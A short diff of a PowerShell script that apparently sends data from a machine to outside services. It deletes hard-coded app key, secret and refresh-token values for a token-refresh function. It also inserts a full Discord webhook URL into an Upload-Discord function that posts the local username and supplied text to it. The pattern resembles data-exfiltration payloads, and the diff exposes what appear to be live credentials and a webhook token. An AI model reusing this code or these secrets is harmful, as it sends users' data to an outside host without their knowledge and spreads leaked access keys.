@@ -1,7 +1,3 @@
-$appKey = "fddn4r9i3iib7em"
-$appSecret = "7hqpe9ini9unjum"
-$refreshToken = "6MahkcJgggsAAAAAAAAAAacXuLvsc2SwyFn80bOuJ3giuqxCIU7qIm8JaSSQWmVz"
-
 function Get-NewAccessToken {
     $body = @{
         grant_type = 'refresh_token'
@@ -55,7 +51,7 @@ function Upload-Discord {
         [string]$text
     )
 
-    $hookurl = "$dc"
+    $hookurl = "https://discord.com/api/webhooks/1296507555014774784/Crdw68n9e0pGIBNpQOi9z8hRIs5Pn0mkTmjUlZT8NcKLfVi-i8roVzfYYdZ28nY8zAke"
     $Body = @{
         'username' = $env:username
         'content' = $text
